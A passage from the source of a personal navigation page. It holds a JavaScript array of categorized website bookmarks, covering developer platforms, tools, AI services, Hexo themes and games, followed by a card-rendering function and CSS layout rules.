\"https://t8.baidu.com/it/u=945984959,3948445137&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"CSDN 中文IT技术交流平台,创建于1999年,包含原创博客、精品问答、职业培训、技术论坛\" }, { \"title\": \"OSCHINA\", \"url\": \"https://www.oschina.net/\", \"img\": \"https://t8.baidu.com/it/u=2619601293,3923045050&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"OSCHINA - 中文开源技术交流社区\" }, { \"title\": \"华为开发者\", \"url\": \"https://developer.apple.com/\", \"img\": \"https://res-static.hc-cdn.cn/cloudbu-site/china/zh-cn/hdhomeportal/logonew.png\", \"description\": \"开发者,华为云,HMS,鸿蒙,鲲鹏,昇腾,数据库,AI,5G,云原生,云计算,大赛,华为开发者,华为\" }, { \"title\": \"HarmonyOS开发者社区\", \"url\": \"https://harmonyosdev.csdn.net/\", \"img\": \"https://devpress.csdnimg.cn/041451c94cbd45af95e7dab96007154a.png\", \"description\": \"HarmonyOS开发者社区\" }, { \"title\": \"apple developer\", \"url\": \"https://developer.apple.com/\", \"img\": \"https://developer-rno.apple.com/events/developer-centers/images/discover-programs_2x.jpg\", \"description\": \"apple developer\" }, { \"title\": \"vivodev\", \"url\": \"https://developer.vivo.com/\", \"img\": \"https://ecmb.bdimg.com/tam-ogel/-1540521831_1768335019_88_88.png\", \"description\": \"vivo developer,vivo国外手机商店,vivo appstore,vivo全球手机商城\" }, { \"title\": \"AWS Amazon Web Services\", \"url\": \"https://aws.amazon.com/\", \"img\": \"https://a0.awsstatic.com/libra-css/images/logos/aws_smile-header-desktop-en-white_59x35.png\", \"description\": \"AWS 云服务-专业的大数据和云计算服务以及云解决方案提供商\" }, { \"title\": \"阿里云\", \"url\": \"https://aliyun.com/\", \"img\": \"https://t8.baidu.com/it/u=4057341977,137104390&fm=190&app=131&size=f242,150&n=0&f=PNG\", \"description\": \"上云就上阿里云。\" }, { \"title\": \"googledev\", \"url\": \"https://developers.google.com\", \"img\": \"https://t9.baidu.com/it/u=1149675542,2513106999&fm=217&app=126&size=f242,150&n=0&f=JPEG\", \"description\": \"Google for Developers - 从AI和云到移动和Web\" }, { \"title\": \"ThinkPHP\", \"url\": \"https://www.thinkphp.cn/\", \"img\": \"https://doc.topthink.com/lfs/02503b197ad195b8cc5eb97db82d7d0e657ade6c72e780dd8e1994f1ad806452.dat\", \"description\": \"轻量级PHP框架|专注WEB应用开发18年 · ThinkPHP\" }, { \"title\": \"掘金\", \"url\": \"https://juejin.cn/\", \"img\": \"https://lf-web-assets.juejin.cn/obj/juejin-web/xitu_juejin_web/e08da34488b114bd4c665ba2fa520a31.svg\", \"description\": \"掘金是面向全球中文开发者的技术内容分享与交流平台\" }, { \"title\": \"hellogithub\", \"url\": \"https://hellogithub.com/\", \"img\": \"https://img.hellogithub.com/logo/logo.png\", \"description\": \"开源,open source,开源社区,开源项目\" }, { \"title\": \"BigBear\", \"url\": \"https://bigbearvpn.sodtool.com/\", \"img\": \"https://wiki-bigbearvpn.sodtool.com/images/logo_black.png\", \"description\": \"BigBear\" }, { \"title\": \"mitce\", \"url\": \"https://mitce.com/?language=chinese\", \"img\": \"https://st0.dancf.com/static/02/202306090204-51f4.png\", \"description\": \"提供安全的加密網路代理\" }, { \"title\": \"腾讯云\", \"url\": \"https://cloud.qq.com/\", \"img\": \"https://cloudcache.tencent-cloud.com/qcloud/portal/kit/images/slice/logo.23996906.svg\", \"description\": \"腾讯云,tencent cloud,云服务器,云主机,CDN,对象存储,域名注册备案,云存储,云数据库,互联网+解决方案,QQ云\" }, { \"title\": \"筋斗云\", \"url\": \"https://www.jindouyun.cn/\", \"img\": \"https://t7.baidu.com/it/u=1943493154,1028907721&fm=217&app=126&size=f242,150&n=0&f=PNG\", \"description\": \"筋斗云 - 简单好用、高性价比的云服务器_云主机\" }, { \"title\": \"华为云\", \"url\": \"https://cloud.huawei.com/\", \"img\": \"https://id1.cloud.huawei.com/CAS/static_rss/rss_20241031/CAS/vue3/vuebuild/img/cloundLoginLogo.png\", \"description\": \"华为云空间，华为云服务，华为云，查找手机，查找设备，华为手机丢了，荣耀手机丢了，云备份，华为手机云服务，华为手机丢了远程锁定\" } ] }, { \"category\": \"Tools\", \"items\": [ { \"title\": \"json\", \"url\": \"https://www.sojson.com/\", \"img\": \"https://t9.baidu.com/it/u=2962407189,358182402&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"json格式化\" }, { \"title\": \"freemp3\", \"url\": \"https://www.qeecc.com/\", \"img\": \"http://www.qeecc.com/images/logo.png\", \"description\": \" freemp3 qm\" }, { \"title\": \"压缩图片\", \"url\": \"https://www.xunjietupian.com/yasuo/\", \"img\": \"https://www.xunjietupian.com/img/icon/icon_logo.svg\", \"description\": \"在线快速压缩图片4\" }, { \"title\": \"BTC USD\", \"url\": \"https://www.tradingview.com/symbols/BTCUSD/\", \"img\": \"https://t8.baidu.com/it/u=210671946,991419608&fm=3035&app=3035&size=f242,162&n=0&g=0n&f=JPEG\", \"description\": \" BTC USD — Bitcoin Price and Chart — TradingView\" }, { \"title\": \"爱站网\", \"url\": \"https://www.aizhan.com/\", \"img\": \"https://statics.aizhan.com/images/img/logo.png\", \"description\": \"站长工具-百度权重排名查询-站长seo查询 - 爱站网\" }, { \"title\": \"站长之家\", \"url\": \"https://www.chinaz.com/\", \"img\": \"https://t9.baidu.com/it/u=1976338083,3457931785&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"站长之家 - 站长资讯-我们致力于为中文网站提供动力！\" }, { \"title\": \"小鸡监控平台\", \"url\": \"https://ping0.cc/vpsmon/30day\", \"img\": \"https://t9.baidu.com/it/u=3796491837,1274263105&fm=217&app=126&size=f242,150&n=0&f=JPEG\", \"description\": \"最近30天-IP地址归属地查询-全球小鸡监控平台\" }, { \"title\": \"知无不言\", \"url\": \"https://wearesellers.com/ \", \"img\": \"https://t9.baidu.com/it/u=2291076767,879038089&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"跨境电商人的科学世界\" }, { \"title\": \"webcams\", \"url\": \"https://www.skylinewebcams.com/\", \"img\": \"https://cdn.jsdelivr.net/gh/SkylineWebcams/web@main/skylinewebcams.svg\", \"description\": \"webcams\" }, { \"title\": \"Wayback Machine\", \"url\": \"https://web.archive.org/\", \"img\": \"/images/face.png\", \"description\": \"wawayback machine ， Internet档案馆(Internet Archive)，时间回溯机\" }, { \"title\": \"Radio Garden\", \"url\": \"https://radio.garden/\", \"img\": \"/images/face.png\", \"description\": \"Radio Garden – Explore live radio\" }, { \"title\": \"一证通查 \", \"url\": \"https://getsimnum.caict.ac.cn\", \"img\": \"/images/face.png\", \"description\": \"电话卡一证通查\" }, { \"title\": \"弹琴吧\", \"url\": \"https://www.tan8.com/\", \"img\": \"https://www.tan8.com/static/tan8/style/img/LOGO_s_new2.png?2401\", \"description\": \"《弹琴吧》官网tan8.com-钢琴谱大全，吉他谱大全，学钢琴，学吉他，就来弹琴吧弹吧\" }, { \"title\": \"pinterest\", \"url\": \"https://www.pinterest.com/\", \"img\": \"https://www.baidu.com/img/flexible/logo/pc/.png\", \"description\": \"发现想要尝试的食谱、家居创意、时尚灵感及其他创意点子。\" }, { \"title\": \"花瓣\", \"url\": \"https://huaban.com/\", \"img\": \"https://st0.dancf.com/static/02/202306090204-51f4.png\", \"description\": \"花瓣网 - 陪你做生活的设计师（创意灵感天堂，搜索、发现设计灵感、设计素材）\" }, { \"title\": \"修剪mp3\", \"url\": \"https://audiotrimmer.com/cn\", \"img\": \"https://audiotrimmer.com/images/logo.png?v=1 \", \"description\": \"Audio Trimmer 是一个简单的在线工具，可让您即时修剪mp3和其他音频文件\" }, { \"title\": \"制作ico\", \"url\": \"https://www.bitbug.net/\", \"img\": \"\", \"description\": \"在线制作ico图标 | 在线ico图标转换工具 方便制作favicon.ico\" }, { \"title\": \"今日热榜\", \"url\": \"https://tophub.today/\", \"img\": \"https://file.ipadown.com/tophub/assets/images/logo.png\", \"description\": \"今日热榜,Tophub,热门新闻,今日头条,热搜,热词,新闻聚合\" }, { \"title\": \"抖音/TikTok/Bili下载\", \"url\": \"https://snapany.com/zh/tiktok\", \"img\": \"https://snapany.com/favicon.ico\", \"description\": \"TikTok 哔哩哔哩 Pinterest Facebook VK Snapchat Threads 视频图片 Suno音乐 \" } ] }, { \"category\": \"AI\", \"items\": [ { \"title\": \"kimi\", \"url\": \"https://kimi.ai/\", \"img\": \"https://ecmb.bdimg.com/tam-ogel/-1772417172_-552089199_88_88.jpg \", \"description\": \"kimi\" }, { \"title\": \"讯飞星火\", \"url\": \"https://xinghuo.xfyun.cn/\", \"img\": \"https://fc1tn.baidu.com/it/u=1861166136,3857095671&fm=202&mola=new&crop=v1\", \"description\": \"讯飞星火大模型，科大讯飞\" }, { \"title\": \"腾讯AI代码\", \"url\": \"https://copilot.tencent.com/chat\", \"img\": \"https://acc-1258344699.cos.accelerate.myqcloud.com/web/website/assets/logo_text-BjFpEzKf.png\", \"description\": \"腾讯云 AI 代码助手\" }, { \"title\": \"AI导航\", \"url\": \"https://www.ainavpro.com/\", \"img\": \"https://www.ainavpro.com/wp-content/uploads/2023/03/logo-8-e1677916867522.png\", \"description\": \"ai导航,ai产品,ai写作,chatgpt,人工智能\" }, { \"title\": \"AI万花筒\", \"url\": \"https://www.aiwht.com/\", \"img\": \"https://ai-img.aiwht.com/wp-content/uploads/2023/03/1680232059212_AI%E5%88%86%E5%BC%80%E7%9A%84-360x80-1.png\", \"description\": \"AI万花筒| ai导航 连接AI新世界\" }, { \"title\": \"快手-可灵\", \"url\": \"https://kolors.kuaishou.com/\", \"img\": \"https://ali2.a.kwimgs.com/kos/nlav10378/aiwp/assets/kling-logo-zh-5iJvXAUm.png\", \"description\": \"快手-可灵，生成图片/视频\" }, { \"title\": \"通情\", \"url\": \"https://tongyi.aliyun.com/qianwen/\", \"img\": \"https://img.alicdn.com/imgextra/i1/O1CN01asLYeX1WhbsyEZn5u_!!6000000002820-55-tps-56-56.svg\", \"description\": \"通情、达义，你的全能AI助手\" }, { \"title\": \"豆包-字节\", \"url\": \"https://www.doubao.com/chat/\", \"img\": \"https://ecmb.bdimg.com/tam-ogel/1797406267_1647065546_88_88.jpg\", \"description\": \"豆包是字节跳动公司基于云雀模型开发的AI工具，提供聊天机器人、写作助手以及英语学习助手等功能\" }, { \"title\": \"文心一言\", \"url\": \"https://yiyan.baidu.com/\", \"img\": \"https://nlp-eb.cdn.bcebos.com/static/eb/asset/logo.8a6b508d.png\", \"description\": \"写文案、想点子，又能陪你聊天、答疑解惑。\" }, { \"title\": \"marscode\", \"url\": \"https://www.marscode.cn/\", \"img\": \"https://p9-arcosite.byteimg.com/tos-cn-i-goo7wpa0wc/8f2f23baeb3c4be4ade7804de39aec5a~tplv-goo7wpa0wc-image.image\", \"description\": \"豆包旗下的编程助手，提供智能补全、智能预测、智能问答等能力\" }, { \"title\": \"suno\", \"url\": \"https://suno.com/\", \"img\": \"https://pbs.twimg.com/profile_images/1807517561598181376/tgNisKbX.jpg\", \"description\": \"Suno is building a future where anyone can make great music.\" }, { \"title\": \"ollama\", \"url\": \"https://ollama.com/ \", \"img\": \"https://ollama.com/public/ollama.png\", \"description\": \"Run Llama, Phi, Mistral, Gemma Get up and running with large language models.\" }, { \"title\": \"Cursor\", \"url\": \"https://www.cursor.com/\", \"img\": \"https://avatars.githubusercontent.com/u/126759922?s=48&v=4\", \"description\": \"The AI Code Editor\" }, { \"title\": \"Ai导航\", \"url\": \"https://www.ainavpro.com/\", \"img\": \"https://www.ainavpro.com/wp-content/uploads/2023/03/logo-8-e1677916867522.png\", \"description\": \"Ai导航 | 最新最前沿的ai产品\" }, { \"title\": \"AI工具集\", \"url\": \"https://ai-bot.cn/\", \"img\": \"https://ai-bot.cn/wp-content/uploads/2023/03/ai-bot-logo-black.png\", \"description\": \"1000+ AI工具集合，国内外AI\" } ] }, { \"category\": \"Web\", \"items\": [ { \"title\": \"有谱么\", \"url\": \"https://yopu.co/\", \"img\": \"https://cdn.yopu.co/img/qrcode_app_download.436360b7.png\", \"description\": \"有谱么是专为手机设计的吉他尤克里里曲谱书\" }, { \"title\": \"什么值得买\", \"url\": \"https://www.smzdm.com/\", \"img\": \"https://t9.baidu.com/it/u=149758115,4084685086&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"什么值得买 | 科学消费 认真生活\" }, { \"title\": \"vscode\", \"url\": \"https://code.visualstudio.com/ \", \"img\": \"https://visualstudio.microsoft.com/wp-content/uploads/2019/09/vs-code-responsive-01-1.png\", \"description\": \"visualstudio code \" }, { \"title\": \"IT桔子\", \"url\": \"https://www.itjuzi.com/\", \"img\": \"https://static.itjuzi.com/images/fSxSdAmviPF7Cxd0aJvnwOTjTJPAQ5AHOscYuWTq.png\", \"description\": \"IT桔子 | 泛互联网创业投资项目信息数据库及商业信息服务商\" }, { \"title\": \"千通彩色库\", \"url\": \"https://www.qtccolor.com/secaiku/\", \"img\": \"https://cdn.qtccolor.com/images/logo.png\", \"description\": \"在线色号色彩查询 - 千通彩色库\" }, { \"title\": \"X API \", \"url\": \"https://developer.x.com/en/products/x-api\", \"img\": \"https://ms.bdimg.com/pacific/0/pic/-1749260314_-150371495.jpg\", \"description\": \"X API | Twitter Developer Platform \" }, { \"title\": \"IG/FB API\", \"url\": \"https://developers.facebook.com/\", \"img\": \"https://images.sftcdn.net/images/t_app-icon-m/p/f96df87d-926f-4954-bf58-f377a573a630/3410194445/instagram-Instagram_icon.png\", \"description\": \"Instagram API | Facebook for Developers\" }, { \"title\": \"TgApi\", \"url\": \"https://core.telegram.org/\", \"img\": \"https://t8.baidu.com/it/u=4184704855,1261911938&fm=217&app=126&size=f242,150&n=0&f=JPEG\", \"description\": \"Telegram APIs\" }, { \"title\": \"TikTokDev\", \"url\": \"https://developers.tiktok.com/\", \"img\": \"https://t7.baidu.com/it/u=3496169845,3458702159&fm=217&app=126&size=f242,150&n=0&f=JPEG\", \"description\": \"TikTok for Developers\" }, { \"title\": \"小红书开放平台\", \"url\": \"https://miniapp.xiaohongshu.com/\", \"img\": \"https://t8.baidu.com/it/u=1809095286,1432785828&fm=217&app=126&size=f242,150&n=0&f=JPEG\", \"description\": \"小红书开放平台\" }, { \"title\": \"白鲸出海\", \"url\": \"https://www.baijing.cn/\", \"img\": \" https://www.baijing.cn/static/img/logo_black.png?v=2\", \"description\": \"移动出海,海外开发者,白鲸出海,白鲸社区\" }, { \"title\": \"无限音乐\", \"url\": \"http://ws.wxmp3.com/\", \"img\": \"http://ws.wxmp3.com/style/images/logo.png\", \"description\": \"无限音乐网|MP3歌曲免费下载,全网MP3免费下载,歌曲下载神器\" }, { \"title\": \"FreeBuf\", \"url\": \"https://www.freebuf.com/\", \"img\": \"https://www.freebuf.com/images/logoMax.png\", \"description\": \"网络安全行业门户\" }, { \"title\": \"eName\", \"url\": \"https://auction.ename.com/tao\", \"img\": \"https://t9.baidu.com/it/u=2971182524,3144420648&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"淘域名 | 域名交易平台：eName.Com\" }, { \"title\": \"又拍云\", \"url\": \"https://www.upyun.com/\", \"img\": \"https://t9.baidu.com/it/u=3516235917,278845167&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"又拍云 加速在线业务 CDN加速 云存储\" }, { \"title\": \"UCloud \", \"url\": \"https://www.ucloud.cn/\", \"img\": \"https://fc1tn.baidu.com/it/u=2776782969,1600626072&fm=202&mola=new&crop=v1\", \"description\": \"云服务器_ UCloud云计算\" }, { \"title\": \"u盘魔术师 \", \"url\": \"https://www.sysceo.com/Software\", \"img\": \"https://www.sysceo.com/Public/images/index/logo.png\", \"description\": \"u盘魔术师 PE \" }, { \"title\": \"七牛云\", \"url\": \"https://www.qiniu.com/\", \"img\": \"https://ecmb.bdimg.com/tam-ogel/600520814_947783485_500_500.png\", \"description\": \"七牛云,七牛云大促,cdn,对象存储,云主机,云短信\" }, { \"title\": \"在线Ping检测\", \"url\": \"https://www.cesu.net/\", \"img\": \"https://www.cesu.net/storage/default/20240422/3537817137167267a7ff56749fd79a407e9a98a25325e34d1a7a31b.jpg\", \"description\": \"免费Ping测试工具-网站在线测速工具\" }, { \"title\": \"京东宙斯\", \"url\": \"https://jos.jd.com/\", \"img\": \"https://img12.360buyimg.com/imagetools/s200x200_jfs/t1/118697/14/19219/13380/5f8597bfEe2f1a7a6/28da4f4bd65f005c.png\", \"description\": \"京东宙斯开发者中心、京东开放平台、京东API、宙斯开放平台、京东宙斯、京东接口\" }, { \"title\": \"拼多多开放平台\", \"url\": \"https://open.pinduoduo.com/\", \"img\": \"https://cdn.pinduoduo.com/upload/home/img/common/pdd_logo_v2.png\", \"description\": \"拼多多开放平台\" }, { \"title\": \"抖店\", \"url\": \"https://op.jinritemai.com/home\", \"img\": \"https://ecmb.bdimg.com/tam-ogel/1876914726_1076566012_88_88.png\", \"description\": \"抖店服务市场，基于抖店数据与接口，赋能内容电商生态，服务商家与开发者\" }, { \"title\": \"阿里百川\", \"url\": \"https://baichuan.taobao.com/ \", \"img\": \"https://img.alicdn.com/tps/TB13Od5LpXXXXX_XXXXXXXXXXXX-150-50.png\", \"description\": \"阿里百川-阿里巴巴无线开放平台,移动开放的主阵地\" }, { \"title\": \"阿里云域名\", \"url\": \"https://mi.aliyun.com/\", \"img\": \"https://t7.baidu.com/it/u=4057341977,137104390&fm=190&app=131&size=f242,150&n=0&f=PNG\", \"description\": \"阿里云域名交易 \" }, { \"title\": \"聚名网\", \"url\": \"https://www.juming.com/ykj/\", \"img\": \"https://www.juming.com/pub/img/new/logo.png\", \"description\": \"聚名网提供一口价域名购买\" }, { \"title\": \"爱名网\", \"url\": \"https://am.22.cn/ykj\", \"img\": \"https://am.22.cn/images/logo.png\", \"description\": \"一口价域名交易-域名买卖交易中心-爱名网AM.22.CN\" } , { \"title\": \"apple\", \"url\": \"https://apple.com/\", \"img\": \"https://ecmb.bdimg.com/tam-ogel/2066431224_743698567_88_88.png\", \"description\": \"apple\" }, { \"title\": \"脉脉\", \"url\": \"https://maimai.cn/\", \"img\": \"https://s.taou.com/static/images/website/pc/logo.png\", \"description\": \"脉脉,脉脉官网,脉脉APP,maimai\" }, { \"title\": \"AI tool\", \"url\": \"https://saasaitools.com/\", \"img\": \"https://saasaitools.com/wp-content/uploads/2023/12/saasaitools_logowhite-1536x327.webp\", \"description\": \" SaaS AI Tools AI tool\" }, { \"title\": \"Newest AI Tools\", \"url\": \"https://theresanaiforthat.com/\", \"img\": \"https://theresanaiforthat.com/favicon-large.png\", \"description\": \"Newest AI Tools There's An AI For That® - Discover The Newest And Best AI Tools\" }, { \"title\": \"uni-app\", \"url\": \"https://dcloud.io/ \", \"img\": \"https://t7.baidu.com/it/u=1571091084,4105095099&fm=217&app=126&size=f242,150&n=0&f=PNG\", \"description\": \"uni-app,uniapp,HBuilderX \" }, { \"title\": \"小米\", \"url\": \"https://www.mi.com/\", \"img\": \"https://ms.bdimg.com/pacific/0/pic/1990065745_1296829299.jpg\", \"description\": \"小米 每个人都能享受科技带来的美好生活\" }, { \"title\": \"forbes\", \"url\": \"https://www.forbes.com/billionaires/ \", \"img\": \"https://www.forbeschina.com/static/images/logo.png\", \"description\": \"forbes福布斯\" },{ title: \"华为\", url: \"https://consumer.huawei.com/\", img: \"https://t9.baidu.com/it/u=2184693209,621087203&fm=190&app=131&size=f242,150&n=0&f=JPEG\", description: \"华为, HUAWEI, HUAWEI官网, 华为官网, 华为网站, 华为消费者官网, 华为产品, 华为新品\" } ] }, { \"category\": \"Hexo\", \"items\": [ { \"title\": \"Hipaper\", \"url\": \"https://github.com/iTimeTraveler/hexo-theme-hipaper\", \"img\": \"https://hexo.io/themes/screenshots/Hipaper.jpg\", \"description\": \"A fashional newspaper, blog theme for Hexo.\" }, { \"title\": \"Fluid \", \"url\": \"https://github.com/fluid-dev/hexo-theme-fluid\", \"img\": \"https://hexo.io/themes/screenshots/Fluid.jpg\", \"description\": \"An elegant and light theme\" }, { \"title\": \"keep\", \"url\": \"https://github.com/XPoet/hexo-theme-keep\", \"img\": \"https://hexo.io/themes/screenshots/Keep.jpg\", \"description\": \"keep writing keep loving\" }, { \"title\": \"A4\", \"url\": \"https://github.com/HiNinoJay/hexo-theme-A4\", \"img\": \"https://hexo.io/themes/screenshots/A4.jpg\", \"description\": \"A hexo theme that looks like an A4 paper.\" }, { \"title\": \"Edinburgh\", \"url\": \"https://github.com/sharvaridesai/hexo-theme-edinburgh\", \"img\": \"https://hexo.io/themes/screenshots/Edinburgh.jpg\", \"description\": \"Clean, beautiful portfolio theme\" }, { \"title\": \"Freemind\", \"url\": \"https://github.com/wzpan/hexo-theme-freemind\", \"img\": \"https://hexo.io/themes/screenshots/Freemind.jpg\", \"description\": \"Fully taking advantages of Bootstrap\" }, { \"title\": \"Aurora \", \"url\": \"https://github.com/auroral-ui/hexo-theme-aurora\", \"img\": \"https://hexo.io/themes/screenshots/Aurora.jpg\", \"description\": \"Futuristic auroral Hexo theme.\" }, { \"title\": \"Reimu\", \"url\": \"https://github.com/D-Sketon/hexo-theme-reimu\", \"img\": \"https://hexo.io/themes/screenshots/Reimu.jpg\", \"description\": \"一款博丽灵梦风格的Hexo主题 | A Hakurei Reimu style Hexo theme.\" }, { \"title\": \"Lightx\", \"url\": \"https://github.com/songquanpeng/hexo-theme-lightx\", \"img\": \"https://hexo.io/themes/screenshots/Lightx.jpg\", \"description\": \"A pure and simple Hexo theme\" }, { \"title\": \"Terminal \", \"url\": \"https://github.com/lazysheep666/terminal_theme\", \"img\": \"https://hexo.io/themes/screenshots/Terminal.jpg\", \"description\": \"A simple and clean theme\" }, { \"title\": \"Replica \", \"url\": \"https://github.com/sabrinaluo/hexo-theme-replica\", \"img\": \"https://hexo.io/themes/screenshots/Replica.jpg\", \"description\": \"A github style replication theme\" }, { \"title\": \"leedom\", \"url\": \"https://github.com/leedom92/hexo-theme-leedom\", \"img\": \"https://hexo.io/themes/screenshots/leedom.jpg\", \"description\": \"A pure hexo theme.\" }, { \"title\": \"Meow\", \"url\": \"https://github.com/chanwj/hexo-theme-meow\", \"img\": \"https://hexo.io/themes/screenshots/Meow.jpg\", \"description\": \"A cute and bright hexo theme suitable for literary creation ( e.g. serial novel, fanfiction ).\" }, { \"title\": \"Hiero\", \"url\": \"https://github.com/iTimeTraveler/hexo-theme-hiero\", \"img\": \"https://hexo.io/themes/screenshots/Hiero.jpg\", \"description\": \"A free magazine and blog style theme\" }, { \"title\": \"Vita \", \"url\": \"https://github.com/Harendra1993/vita\", \"img\": \"https://hexo.io/themes/screenshots/Vita.png\", \"description\": \"A simple and minimal Hexo resume theme\" }, { \"title\": \"Sakura \", \"url\": \"https://github.com/honjun/hexo-theme-sakura\", \"img\": \"https://hexo.io/themes/screenshots/Sakura.jpg\", \"description\": \"A beautiful theme\" }, { \"title\": \"Nayo \", \"url\": \"https://github.com/Lemonreds/hexo-theme-nayo\", \"img\": \"https://hexo.io/themes/screenshots/Nayo.jpg\", \"description\": \"A clean theme\" }, { \"title\": \"xoxo-plus \", \"url\": \"https://github.com/fooying/hexo-theme-xoxo-plus\", \"img\": \"https://hexo.io/themes/screenshots/xoxo-plus.jpg\", \"description\": \"A Simple Template\" }, { \"title\": \"Waline\", \"url\": \"https://waline.js.org/\", \"img\": \"https://waline.js.org/logo.png\", \"description\": \"一款简洁、安全的评论系统。\" }, { \"title\": \"Valine\", \"url\": \"https://valine.js.org/\", \"img\": \"https://valine.js.org/images/valine.png\", \"description\": \"一款快速、简洁且高效的无后端评论系统。\" }, { \"title\": \"来必力\", \"url\": \"https://livere.com/\", \"img\": \"https://livere.com/img/nav/logo_livere_main-colored_zh.png\", \"description\": \"来必力提供社交化评论，社交化登录，我的页面，SNS分享按钮\" } ] }, { category: \"Fun\", items: [ { \"title\": \"兰博基尼\", \"url\": \"https://www.lamborghini.com/ \", \"img\": \"https://t9.baidu.com/it/u=637130529,2781676095&fm=217&app=126&size=f242,150&n=0&f=JPEG\", \"description\": \"兰博基尼汽车官方网站\" }, { \"title\": \"vivo\", \"url\": \"https://www.vivo.com/\", \"img\": \"https://ecmb.bdimg.com/tam-ogel/-1540521831_1768335019_88_88.png\", \"description\": \" vivo，vivo官网，vivo智能手机\" }, { title: \"哔哩哔哩\", url: \"https://www.bilibili.com/\", img: \"https://activity.hdslb.com/zzjs/20160608appDownload/img/pc/tittle.png\", description: \"哔哩哔涛\" }, { title: \"youtube\", url: \"https://www.youtube.com/\", img: \"https://t8.baidu.com/it/u=1745702888,2743145560&fm=217&app=126&size=f242,150&n=0&f=JPEG\", description: \"youtube\" } ] }, { category: \"Game\", items: [ { \"title\": \"byrut \", \"url\": \"https://byrutgame.org/\", \"img\": \"https://byrutgame.org/templates/byrut_upd/images/logo.png\", \"description\": \"byrut Cкачать игры на \" }, { \"title\": \"螃蟹\", \"url\": \"https://www.pxb7.com/\", \"img\": \"https://www.pxb7.com/img/logo.45da5e95.png\", \"description\": \"螃蟹游戏账号交易代售平台\" }, { \"title\": \"交易猫\", \"url\": \"https://www.jiaoyimao.com/\", \"img\": \"https://t9.baidu.com/it/u=3394740754,1697665746&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"交易猫_手游交易平台\" }, { title: \"雷电模拟器\", url: \"https://www.ldmnq.com/\", img: \"https://res.ldmnq.com/gw/static/gw_ch/dist/client/img/logo.c0fc5c8.svg\", description: \"雷电安卓模拟器\" }, { title: \"biubiu加速器\", url: \"https://www.biubiu001.com/\", img: \"https://res.biubiu001.com/web/www/img/header_biubiu_logo.3f871d8e.png\", description: \"biubiu加速器_免费的手游加速器_电竞级PC网游加速器\" }, { title: \"isaac wiki\", url: \"https://isaac.huijiwiki.com/wiki/T130\", img: \"https://av.huijiwiki.com/site_avatar_isaac_l.png?1732216641\", description: \"isaac wiki\" } ] } ]; function renderCards(data) { let html = ''; data.forEach(category => { html += ` ${category.category} `; category.items.forEach(item => { html += ` ${item.title} ${item.description} `; }); html += ``; }); return html; } document.getElementById('app3').innerHTML = renderCards(data); @media (min-width:1200px){ .col-xl-5a{flex:0 0 20%;max-width:20%} .col-xl-6a{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%} .col-xl-7a{flex:0 0 14.285714%;max-width:14.285714%} .col-xl-8a{flex:0 0 12.5%;max-width:12.5%} } @media (min-width:1400px){ .container-lg{max-width:1340px} } @media (min-width: 1680px){ .d-xxl-block{display:block!important} .col-xxl-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%} .col-xxl-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%} .col-xxl-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%} .col-xxl-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%} .col-xxl-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%} .col-xxl-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%} .col-xxl-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%} .col-xxl-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%} .col-xxl-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%} .col-xxl-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%} .col-xxl-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%} .col-xxl-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%} .col-xxl-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%} .col-xxl-5a{flex:0 0 20%;max-width:20%} .col-xxl-6a{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%} .col-xxl-7a{flex:0 0 14.285714%;max-width:14.285714%} .col-xxl-8a{flex:0 0 12.5%;max-width:12.5%} .col-xxl-10a{flex:0 0 10%;max-width:10%} .mx-xxl-n5{margin-left:-5rem!important;margin-right:-5rem!important} .container-lg{max-width:1400px} } .row { display: -ms-flexbox; display: flex; -ms-flex-wrap: wrap; flex-wrap: wrap; margin-right: -15px; margin-left: -15px } .size-50{width:50px;height:50px} .size-70{width:70px;height:70px} .flex-wrap-reverse { -ms-flex-wrap: wrap-reverse!important; flex-wrap: wrap-reverse!important } .flex-fill { -ms-flex: 1 1 auto!important; flex: 1 1 auto!important } .flex-grow-0 { -ms-flex-positive: 0!important; flex-grow: 0!important } .flex-grow-1 { -ms-flex-positive: 1!important; flex-grow: 1!important } .flex-shrink-0 { -ms-flex-negative: 0!important; flex-shrink: 0!important } .flex-shrink-1 { -ms-flex-negative: 1!important; flex-shrink: 1!important } .justify-content-start { -ms-flex-pack: start!important; justify-content: flex-start!important } .justify-content-end { -ms-flex-pack: end!important; justify-content: flex-end!important } .justify-content-center { -ms-flex-pack: center!important; justify-content: center!important } .text-gray{color:#555} .overflowClip_1{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;word-break:break-all;display:-webkit-box!important;-webkit-line-clamp:1;-webkit-box-orient:vertical} .overflowClip_1{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:block!important} .overflowClip_2{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;word-break:break-all;display:-webkit-box!important;-webkit-line-clamp:2;-webkit-box-orient:vertical} .url-card .url-body{transform:translateY(0px);-webkit-transform:translateY(0px);-moz-transform:translateY(0px);-webkit-transition:all 0.3s ease;-moz-transition:all 0.3s ease;-o-transition:all 0.3s ease;transition:all 0.3s ease} .url-card 